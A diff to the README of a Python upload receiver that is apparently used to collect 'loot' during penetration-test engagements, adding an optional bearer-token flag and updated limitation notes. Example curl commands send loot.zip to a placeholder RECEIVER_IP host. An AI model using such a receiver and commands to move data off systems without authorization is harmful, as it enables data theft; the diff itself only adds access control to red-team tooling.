@@ -40,6 +40,7 @@ $ python3 upload_server.py --bind 0.0.0.0 --port 8443 --dir /tmp/loot \
 | `--dir` | `uploads` | Destination directory (created if missing) |
 | `--max-size` | `1073741824` (1 GiB) | Maximum accepted body size in bytes; `0` disables the limit |
 | `--overwrite` | off | Overwrite existing files instead of adding a numeric suffix |
+| `--token` | none (disabled) | Require this bearer token on every request |
 
 Send a file as the raw request body:
 
@@ -94,12 +95,27 @@ $ curl --data-binary @loot.zip "http://RECEIVER_IP:8000/?name=loot.zip&format=js
 {"status": 201, "message": "Saved 42817 bytes to uploads/loot.zip", "bytes": 42817, "elapsed_seconds": 0.012, "filename": "loot.zip"}
 ```
 
+Pass `--token` to require a bearer token on every request. When set, requests
+must include a matching `Authorization: Bearer TOKEN` header or they are
+rejected with `401` before any data is read or any endpoint logic runs:
+
+```console
+$ python3 upload_server.py --token s3cr3t
+
+$ curl -H "Authorization: Bearer s3cr3t" --data-binary @loot.zip \
+    "http://RECEIVER_IP:8000/?name=loot.zip"
+```
+
+Auth is disabled by default (no `--token` given).
+
 Press `Ctrl-C` in the receiver terminal to stop the server.
 
 ## Current behavior and limitations
 
 - POST saves a file; `GET /health` reports the running configuration; any
   other path or method returns `404`.
+- Authentication is optional and off unless `--token` is passed; there is no
+  encryption, so a bearer token is only as safe as the network it crosses.
 - The request body is treated as opaque binary data; multipart form uploads
   are not parsed.
 - Filenames are reduced to their basename before being placed in the upload
@@ -112,7 +128,7 @@ Press `Ctrl-C` in the receiver terminal to stop the server.
   or over-`--max-size` requests are rejected before any data is read.
 - Requests are handled concurrently (one thread per connection), so a slow
   or large upload doesn't block other clients.
-- There is no authentication, encryption, or access control.
+- There is no encryption or fine-grained access control.
 
 Because the listener binds to every network interface, use host firewall rules
 and an engagement-controlled network to restrict who can reach it. Captured
